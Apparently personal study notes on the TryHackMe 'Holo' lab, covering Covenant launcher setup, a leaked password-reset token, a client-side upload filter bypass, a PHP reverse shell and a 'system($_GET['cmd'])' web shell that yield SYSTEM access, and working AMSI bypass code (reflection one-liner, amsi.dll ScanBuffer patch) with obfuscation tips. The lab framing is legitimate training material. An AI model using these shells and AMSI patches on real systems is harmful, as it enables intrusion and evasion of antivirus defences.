-   `Mshta` Generates an HTA file to launch a grunt using `mshta.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)[https://lolbas-project.github.io/lolbas/Binaries/Mshta/](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
-   `Regsrv32` Generates an SCT file to launch a grunt using `regsrv32.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)[https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
-   `Wmic` Generates an XSL file to launch a grunt using `wmic.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)[https://lolbas-project.github.io/lolbas/Binaries/Wmic/](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
-   `Cscript` Generate a JScript file to launch a grunt using `cscript.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)[https://lolbas-project.github.io/lolbas/Binaries/Cscript/](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)
-   `Wscript` Generate a JScript file to launch a grunt using `wscript.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Wscript/](https://lolbas-project.github.io/lolbas/Binaries/Wscript/)[](https://lolbas-project.github.io/lolbas/Binaries/Wscript/)
There are several options for each launcher, with some launchers having specific options. For this task, we will be focusing on the binary launcher and its options. The configuration options are outlined below.
-   `Listener` Listener the grunt will communicate with.
-   `ImplantTemplate` Type of implant launcher will use.
-   `DotNetVersion` .NET version launcher will use, dependent on `ImplantTemplate`.
-   `Delay` Time grunt will sleep in-between callbacks. A larger delay can aid in stealthy communications.
-   `JitterPercent` Percent of variability in `Delay`.
-   `ConnectAttempts` Amount of times grunt will attempt to connect back to the server before quitting.
-   `KillDate` Date specified grunt will quit and stop calling back.
To create a basic launcher for this network, we only suggest editing the `Listener` and `ImplantTemplate`
Once created, the launcher will be downloaded or output a one-liner that can be copied. You can then use the launcher as needed to deploy grunts.
![](https://i.imgur.com/IREQTwm.png)
To deploy a grunt, you will only need to transfer your launcher to your target machine and execute the payload using your preferred method; this will change based on what launcher you decide to use.
Once executed, the grunt should check back into the server and appear within the _Grunt_ tab.
**Note:** This is only an example of executing a grunt; you will not need to execute a grunt until later tasks.
![](https://i.imgur.com/sk5C4K7.png)
If you navigate to the grunt to interact with it, you will be given an interaction menu. From here, you can remotely control the grunt and execute shell commands and modules. This will be covered further in-depth in Task 29.
![](https://i.imgur.com/XSEdAaJ.png)
Answer the questions below
Read the above and practice building a launcher.
Completed
![[Pasted image 20230201162433.png]]
Now that we have access to the internal network and have identified a new target, S-SRV01. We know that S-SRV01 has an open web server that we can look at to begin our attack.
We have a few credentials that we can try as well as a username and username scheme that we can use to attempt to gain access to the website.
Looking through the web app, we see a password reset and a valid username. We can poke at the web app to identify vulnerabilities that we can exploit to gain access to the webserver.
Password resets will typically utilize tokens to keep track of users. They will authenticate a reset request as it is sent. The web app will send the token privately when a reset is requested. Sometimes a reset can be misconfigured and leak the token used to spoof a user and reset a controlled user's password. We will be covering an example of this vulnerability along with the vulnerable source code below.
To understand this vulnerability, we can begin by looking at the source code behind the vulnerability. All code below is performed server-side; however, testers can find the token by looking through client-side storage.
`db.findOne({ email:emailAddress }, function(err, doc) {         if(!doc){      return res.send('Email address not in our system');         }else{      var secret = doc.password + '-' +doc.createdTime;             var payload = {                 id: doc._id,                 email: doc.email             };            var token = jwt.encode(payload, secret);      res.json({          resettoken: token,          status: 'Success'      });      res.end();       }     });   `
The specific part of the code that is vulnerable is when the `resettoken` is sent via JSON. This will leak the token to client-side storage. Find the specific code block below.
`res.json({    resettoken: token,    status: 'Success'   });`
To exploit this, we can utilize Chrome and/or Firefox developer tools. Responses from the web server can be in the form of a cookie or a JSON token stored in client-side storage.
You can find the token under either _Application_ for a cookie or _Network_ for a JSON token.
![](https://i.imgur.com/J1II5W7.png)
Once you have retrieved the token from the JSON response or cookie, you can submit it within the URL query under _?token_.
It is important to note that each company or webserver will handle resets and tokens differently. Some may opt for a JWT solution; others may prefer a local database solution; it all depends on the developers themselves, and vulnerabilities may change depending on how the server-side code is written.
Answer the questions below
```text
http://10.200.108.31/login.php?user=gurag&password=AAAA

Invalid Username or Password

Inspect/Storage 

forgot password

http://10.200.108.31/password_reset.php?user=gurag&user_token=

user_token:  ffb12226db46d7c5b2b73872e5d4ae3faa2dc11bd80beb037eaa93b56f3229368d57b9b9aca7a86c3967cd57c395d52eca19

Size:110

10.200.108.31/password_reset.php?user=gurag&user_token=ffb12226db46d7c5b2b73872e5d4ae3faa2dc11bd80beb037eaa93b56f3229368d57b9b9aca7a86c3967cd57c395d52eca19

http://10.200.108.31/reset.php

now can reset pass :)

updating gurag:anypass (gurag)

http://10.200.108.31/password_update.php?user=gurag&password=gurag

Password successfuly updated!
HOLO{bcfe3bcb8e6897018c63fbec660ff238}

login

http://10.200.108.31/home.php
```
![[Pasted image 20230201165120.png]]
What user can we control for a password reset on S-SRV01?
*gurag*
What is the name of the cookie intercepted on S-SRV01?
Application in Chrome developer tools.
*user_token*
What is the size of the cookie intercepted on S-SRV01?
*110*
What page does the reset redirect you to when successfully authenticated on S-SRV01?
You may need to refresh the page before you can get a working reset token.
*reset.php*
Now that we have successful authentication to the web app we know that we have an upload page, however, from code analysis the page uses client-side filtering meaning we can only upload images. We can bypass these filters using BurpSuite.
From GeekforGeeks, client-side filtering is, "These are the types of filter checks present in the browser itself. When the user types an input, the input is verified by the client-side filters. If the data entered by the user is valid, the input is accepted else an error is thrown depending on what wrong input the user has typed."
There are four easy ways to bypass a client-side upload filter:
1.  Turn off JavaScript in your browser - this will work provided the site doesn't require JavaScript in order to provide basic functionality. If turning off JavaScript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
2.  Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.
3.  Intercept and modify the file upload. Where the previous method works the webpage is loaded, this method allows the web page to load as normal but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process of using this method in the course of the task.
before
4.  Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like `curl`? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client-side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: `curl -X POST -F "submit=<value>" -F "<file-parameter>=@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
To help us identify the client-side filtering and ways we can bypass it we can perform code analysis. Taking a look at the source code below, we see that it is using a basic JavaScript function to check for the MIME type of files.
`<script>    windows.onload = function() {     var upload = document.getElementbyID("fileToUpload");     upload.value="";     upload.addEventListener("change",function(event) {      var file = this.files[0];      if (file.type != "imge/jpeg") {       upload.value="";       alert("dorkus storkus server bork");      }     });    };   </script>   `
In this code, we can see that the filter is using a whitelist to exclude any MIME type that isn't `image/jpeg`.
Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.
Having established this, let's start [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) and reload the page. We will see our own request to the site, but what we really want to see is the server's response, so right-click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":
![](https://i.imgur.com/T0RjAry.png)
When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the JavaScript function before it has a chance to load.
![](https://i.imgur.com/ACgWLpH.png)
Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website.
It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script that is not inside the main page is loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove `^js$|`.
![](https://i.imgur.com/95hi6pX.png)
For more information on file upload vulnerabilities check out '[Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)' by MuirlandOracle.
You can now attempt to upload your launcher or other payloads to the server but you might notice that when trying to execute them they will fail even if they are properly uploaded. This is because there may be some kind of AV or EDR solution active on the box. Move on to the next tasks to learn about AV evasion and how we can successfully pop a shell on the server.
Answer the questions below
Read the above and attempt a client-side filter bypass on S-SRV01.
Completed
![[Pasted image 20230201170114.png]]
```php
http://10.200.108.31/img_upload.php?

http://10.200.108.31/Gawr.png

view-source:http://10.200.108.31/upload.js

function readURL(input) {
  if (input.files && input.files[0]) {

    var reader = new FileReader();

    reader.onload = function(e) {
      $('.image-upload-wrap').hide();

      $('.file-upload-image').attr('src', e.target.result);
      $('.file-upload-content').show();

      $('.image-title').html(input.files[0].name);
    };

    reader.readAsDataURL(input.files[0]);

  } else {
    removeUpload();
  }
}

function removeUpload() {
  $('.file-upload-input').replaceWith($('.file-upload-input').clone());
  $('.file-upload-content').hide();
  $('.image-upload-wrap').show();
}
$('.image-upload-wrap').bind('dragover', function () {
		$('.image-upload-wrap').addClass('image-dropping');
	});
	$('.image-upload-wrap').bind('dragleave', function () {
		$('.image-upload-wrap').removeClass('image-dropping');
});

https://www.revshells.com/

PHP Ivan Sincek
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ nano rev.php
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ more rev.php 
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
....

The file rev.php has been uploaded.

now using gobuster to see where imgs are uploaded

using sshuttle
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ gobuster -t 35 dir -e -u http://10.200.108.31  -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.200.108.31
[+] Method:                  GET
[+] Threads:                 35
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.200.108.31/.htpasswd            (Status: 403) [Size: 303]
http://10.200.108.31/.hta                 (Status: 403) [Size: 303]
http://10.200.108.31/.htaccess            (Status: 403) [Size: 303]
http://10.200.108.31/aux                  (Status: 403) [Size: 303]
http://10.200.108.31/cgi-bin/             (Status: 403) [Size: 303]
http://10.200.108.31/com2                 (Status: 403) [Size: 303]
http://10.200.108.31/com3                 (Status: 403) [Size: 303]
http://10.200.108.31/com1                 (Status: 403) [Size: 303]
http://10.200.108.31/con                  (Status: 403) [Size: 303]
http://10.200.108.31/examples             (Status: 503) [Size: 403]
http://10.200.108.31/Images               (Status: 301) [Size: 340] [--> http://10.200.108.31/Images/]
http://10.200.108.31/images               (Status: 301) [Size: 340] [--> http://10.200.108.31/images/]
http://10.200.108.31/img                  (Status: 301) [Size: 337] [--> http://10.200.108.31/img/]
http://10.200.108.31/index.php            (Status: 200) [Size: 2098]
http://10.200.108.31/licenses             (Status: 403) [Size: 422]
http://10.200.108.31/lpt1                 (Status: 403) [Size: 303]
http://10.200.108.31/lpt2                 (Status: 403) [Size: 303]
http://10.200.108.31/nul                  (Status: 403) [Size: 303]
http://10.200.108.31/phpmyadmin           (Status: 403) [Size: 422]
http://10.200.108.31/prn                  (Status: 403) [Size: 303]
http://10.200.108.31/server-info          (Status: 403) [Size: 422]
http://10.200.108.31/server-status        (Status: 403) [Size: 422]
http://10.200.108.31/web.config           (Status: 200) [Size: 169]
http://10.200.108.31/webalizer            (Status: 403) [Size: 303]
Progress: 4602 / 4615 (99.72%)===============================================================
 Finished
===============================================================

or using chisel

gobuster dir -u http://10.200.108.31 -w /usr/share/dirb/wordlists/common.txt -p socks5://127.0.0.1:1080

found it
http://10.200.108.31/images/
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ rlwrap nc -lvnp 18888
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::18888
Ncat: Listening on 0.0.0.0:18888
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ rlwrap nc -lvnp 18888
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::18888
Ncat: Listening on 0.0.0.0:18888
Ncat: Connection from 10.200.108.31.
Ncat: Connection from 10.200.108.31:49931.
SOCKET: Shell has connected! PID: 4752
Microsoft Windows [Version 10.0.17763.1518]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\web\htdocs\images>whoami
nt authority\system

C:\web\htdocs\images>

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3A33-D07B

 Directory of C:\Users\Administrator\Desktop

12/03/2020  06:32 PM    <DIR>          .
12/03/2020  06:32 PM    <DIR>          ..
12/03/2020  06:32 PM                38 root.txt
               1 File(s)             38 bytes
               2 Dir(s)  14,454,898,688 bytes free

C:\Users\Administrator\Desktop>type root.txt
HOLO{50f9614809096ffe2d246e9dd21a76e1}

it works !! 

another way

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>

This is a code written in PHP which creates a simple HTML form. The form contains a text field and a submit button. When the submit button is clicked, the contents of the text field are passed as a parameter to the system function in PHP, which executes the contents as a shell command.

This code can be dangerous as it allows any user to execute arbitrary shell commands on the server where the code is executed. This can potentially lead to unauthorized access to sensitive information, unauthorized modification of data, or other security risks. It is recommended not to use this code or a similar code in a production environment without proper validation and sanitization of user input to prevent security vulnerabilities.

let's see
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ nano rev_2.php
```
```php
┌──(kali㉿kali)-[~/Holo]
└─$ cat rev_2.php 
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>

http://10.200.108.31/images/rev_2.php?cmd=whoami

nt authority\system
```
![[Pasted image 20230201173038.png]]
![[Pasted image 20230201173905.png]]
![[Pasted image 20230201174309.png]]
### AV Evasion Basically a joke itself....
Note: Before moving on with AV evasion please read the entire section's notes and tasks. This section contains multiple methods and techniques that you can mix and match to reach the end goal of evading anti-virus.
Now that we can upload a file, we notice that our shells are killed or fail at uploading because AV catches them. In the following six tasks, we will be covering the vast topic of AV evasion and how it can be used in conjunction with C2 frameworks like Covenant and offensive tooling. The following tasks compound each other; one task alone will not be enough to evade detections itself. You will need to combine many techniques shown until you have successfully written or created a clean payload/tool. To begin bypassing EDR solutions, we need to understand our first enemy, AMSI.
The Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate into antimalware products. AMSI will scan payloads and scripts before execution inside of the runtime. From Microsoft, "The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads."
For more information about AMSI, check out the Windows docs, [https://docs.microsoft.com/en-us/windows/win32/amsi/](https://docs.microsoft.com/en-us/windows/win32/amsi/)
Find an example of how data flows inside of Windows security features below.
![](https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg)
AMSI will send different response codes based on the results of its scans. Find a list of response codes from AMSI below.
-   AMSI_RESULT_CLEAN = 0
-   AMSI_RESULT_NOT_DETECTED = 1
-   AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
-   AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
-   AMSI_RESULT_DETECTED = 32768
AMSI is fully integrated into the following Windows components.
-   User Account Control, or UAC
-   PowerShell
-   Windows Script Host (wscript and cscript)
-   JavaScript and VBScript
-   Office VBA macros
AMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.
We can look at what PowerShell security features physically look like and are written using InsecurePowerShell, [https://github.com/PowerShell/PowerShell/compare/master...cobbr:master](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by Cobbr. InsecurePowerShell is a GitHub repository of PowerShell with security features removed; this means we can look through the compared commits and identify any security features. AMSI is only instrumented in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. Find the C# code used to instrument AMSI below.
```powershell
`var scriptExtent = scriptBlockAst.Extent;    if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)    {     var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);     throw new ParseException(new[] { parseError });    }       if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)    {     HasSuspiciousContent = true;    }`

This code is written in C# and checks for malicious content in a PowerShell script.

It appears to be using the AmsiUtils class to scan the text of a script stored in the "scriptExtent" object, and the result of the scan is checked against the value "AMSI_RESULT_DETECTED." If the result of the scan is detected, a ParseError object is created with the message "ScriptContainedMaliciousContent" and a ParseException is thrown.

Additionally, the code checks for suspicious content in the "scriptBlockAst" object using the ScriptBlock.CheckSuspiciousContent method, and sets the "HasSuspiciousContent" property to true if the method returns a non-null value.

This code is likely used to perform security checks on PowerShell scripts and to prevent malicious content from being executed.
```
Third-parties can also instrument AMSI in their products using the methods outlined below.
-   AMSI Win32 API, [https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions)
-   AMSI COM Interface, [https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream)
For more information about AMSI integration in third-party products, check out this Microsoft article, [https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience)[](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience)
In the next task, we will look at how we can utilize PowerShell and C# to bypass AMSI.
Answer the questions below
Read the above and investigate how AMSI is instrumented.
Completed
### AV Evasion THEY WONT SEE ME IF I YELL!
Now that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell and C#.
There are a large number of bypasses for AMSI available, a majority written in PowerShell and C#. Find a list of common bypasses below.
-   Patching amsi.dll
-   Amsi ScanBuffer patch
-   Forcing errors
-   Matt Graeber's Reflection, [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
-   PowerShell downgrade
For more information about the variety of bypasses available, check out this GitHub repo, [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
We will be looking at the Matt Graeber reflection method as well as patching amsi.dll.
The first bypass we will be looking at utilizes native PowerShell reflection to set the response value of AMSI to `$null`. Find the PowerShell code written by Matt Graeber below.
```powershell
`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

This code is written in PowerShell and disables the Antimalware Scan Interface (AMSI) feature in the system.

The code uses reflection to access the System.Management.Automation.AmsiUtils class, and retrieves the amsiInitFailed field with the "NonPublic,Static" binding flags. Then it sets the value of the amsiInitFailed field to true, which disables the AMSI feature.

Disabling the AMSI feature can potentially allow malicious scripts to run on a system without being detected by antimalware software. This can pose a security risk and should only be done in controlled environments where the consequences are understood and accepted. In general, it is recommended to keep the AMSI feature enabled for security purposes.
```
The second method we will be looking at is patching amsi.dll written in PowerShell. This bypass is modified by BC-Security inspired by Tal Liberman, [https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py](https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique, [https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs).The bypass will identify DLL locations and modify memory permissions to return undetected AMSI response values.
```powershell
``$MethodDefinition = "          [DllImport(`"kernel32`")]       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);          [DllImport(`"kernel32`")]       public static extern IntPtr GetModuleHandle(string lpModuleName);          [DllImport(`"kernel32`")]       public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);   ";      $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;   $ABSD = 'AmsiS'+'canBuffer';   $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');   [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);   [UInt32]$Size = 0x5;   [UInt32]$ProtectFlag = 0x40;   [UInt32]$OldProtectFlag = 0;   [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);   $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);       [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);   ``  

This is a PowerShell code that modifies the behavior of the Antimalware Scan Interface (AMSI) feature in the system.

The code first creates a managed code using the "Add-Type" cmdlet and defines several methods to interact with the Windows API. These methods are used to retrieve the address of the AMSI function "AmsiScanBuffer" and to modify the memory protection of that address.

The code then retrieves the handle of the "amsi.dll" library and retrieves the address of the "AmsiScanBuffer" function. The memory protection of the function is changed to allow writing.

Finally, the code overwrites 6 bytes of the "AmsiScanBuffer" function with a custom sequence of bytes, effectively changing its behavior.

This code can be dangerous as it modifies the behavior of a security feature in the system. This can potentially allow malicious scripts to run on a system without being detected by antimalware software. This can pose a security risk and should only be done in controlled environments where the consequences are understood and accepted. In general, it is recommended to keep the AMSI feature enabled for security purposes.
```
This may seem like a lot of fancy and chopped-up code if you are unfamiliar with Windows architecture and PowerShell, but we can break it up and identify what each section of code does.
The first section of code lines 3 - 10 will use C# to call-in functions from Kernel32 to identify where amsi.dll has been loaded.
``[DllImport(`"kernel32`")]   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);       [DllImport(`"kernel32`")]   public static extern IntPtr GetModuleHandle(string lpModuleName);      [DllImport(`"kernel32`")]   public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);   ``
Once the C# functions are called in, the code will use Add-type to load the C# and identify the `AmsiScanBuffer` string in lines 13 - 16. This string can be used to determine where `amsi.dll` has been loaded and the address location using `GetProcAddress`.
`$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;   $ABSD = 'AmsiS'+'canBuffer';   $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');   [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);   `
The next section of code lines 17 - 23 will modify memory permissions and patch `amsi.dll` to return a specified value.
`[UInt32]$Size = 0x5;   [UInt32]$Size = 0x5;   [UInt32]$OldProtectFlag = 0;   [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);   $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);      [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);   `
At this stage, we should have an AMSI bypass that partially works. Signatures for most AMSI bypasses have been crafted, so this means that AMSI and Defender themselves will catch these bypasses. This means we will need to obfuscate our code a slight bit to evade signatures. AMSI obfuscation will be covered in the next task.
For more information about AMSI bypasses, check out the following resources.
-   [](https://offensivedefence.co.uk/posts/making-amsi-jump/)[https://offensivedefence.co.uk/posts/making-amsi-jump/](https://offensivedefence.co.uk/posts/making-amsi-jump/)
-   [](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)[https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)
-   [](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)[https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
-   [](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)[https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)
-   [](https://blog.f-secure.com/hunting-for-amsi-bypasses/)[https://blog.f-secure.com/hunting-for-amsi-bypasses/](https://blog.f-secure.com/hunting-for-amsi-bypasses/)
-   [](https://www.contextis.com/us/blog/amsi-bypass)[https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)
-   [](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)[https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
-   [https://amsi.fail/](https://amsi.fail/)[](https://amsi.fail/)
-   [](https://rastamouse.me/blog/asb-bypass-pt2/)[https://rastamouse.me/blog/asb-bypass-pt2/](https://rastamouse.me/blog/asb-bypass-pt2/)
-   [](https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)[https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
-   [](https://www.youtube.com/watch?v=F_BvtXzH4a4)[https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)
-   [https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
-   [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
Answer the questions below
Read the above and select an AMSI bypass to obfuscate.
Completed
```text
https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ nano bypass-AMSI.ps1
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ more bypass-AMSI.ps1                   
function Bypass-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
....
```
![[Pasted image 20230201182228.png]]
### AV Evasion AMSIception
Now that we have a partially working bypass, we need to obfuscate the code to bypass detections. I know, AMSIception... There are several tools and articles that can help us out in this process to understand the process and requirements better. It is helpful to think of obfuscation as an art rather than a technique. It can be experimentative and repetitive as you modify and tamper with source code and signatures.
To begin our obfuscation journey, we will start with manual obfuscation along with signature checking scripts. In the next task, we will cover automated obfuscators like Invoke-Obfuscation and ISE-Steroids. The manual route is far more reliable compared to automated obfuscators as you are checking and tampering with each signature within your sample, in this case, an AMSI bypass.
Generally, AMSI is only looking for weak strings for AMSI bypasses such as `AmsiScanBuffer`, `amsiInitFailed`, `AmsiUtils`, etc. This is where string concatenation can come into play and aid in breaking these string signatures. As EDR solutions and products progress, these signatures and methods may become more robust. Still, these identical signatures have been prevalent for a reasonable amount of time and aren't expected to be changing any time soon for non-commercial products.
To aid in our obfuscation efforts, we will use the AMSITrigger script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick. This script will take a given PowerShell script and each unique string within it against AMSI to identify what strings are being used to flag the script as malicious. This will only test against AMSI and not Defender; we will go over obfuscating for Defender in a later task; however, for this task, we only need to worry about AMSI since everything is file-less (mostly).
AMSI will also utilize regex to aggregate risk assessment; this means that no one individual string might be flagged rather an entire code block. This can be painful for us to obfuscate and require other techniques like encoding, type acceleration, and run-time decoding.
To use AMSITrigger, we only need to specify two parameters, `-u`, `—url` or `-i`, `—inputfile` and `-f`, `—format`. Find example syntax below.
Syntax: `.\\AMSITrigger.exe -u <URL> -f 1` or `.\\AMSITrigger.exe -i <file> -f 1`
![](https://i.imgur.com/tioOmMN.png)
Running the script against the AMSI bypass from BC-Security shown in the previous task, we see that the `VirtualProtect` code block was flagged along with the run-time buffer.
We can also use format 3 to see inline with the code with precisely what is being flagged.
![](https://i.imgur.com/25opDVU.png)
The first method of manual obfuscation we will look at is string concatenation. From the Microsoft documentation, "Concatenation is the process of appending one string to the end of another string. You concatenate strings by using the + operator. For string literals and string constants, concatenation occurs at compile-time; no run-time concatenation occurs. For string variables, concatenation occurs only at run time." Concatenation is a fairly common technique used within most programming languages; however, we can abuse it to aid us in obfuscation. Find an example of string concatenation below.
`$OBF = 'Ob' + 'fu' + 's' +'cation'`
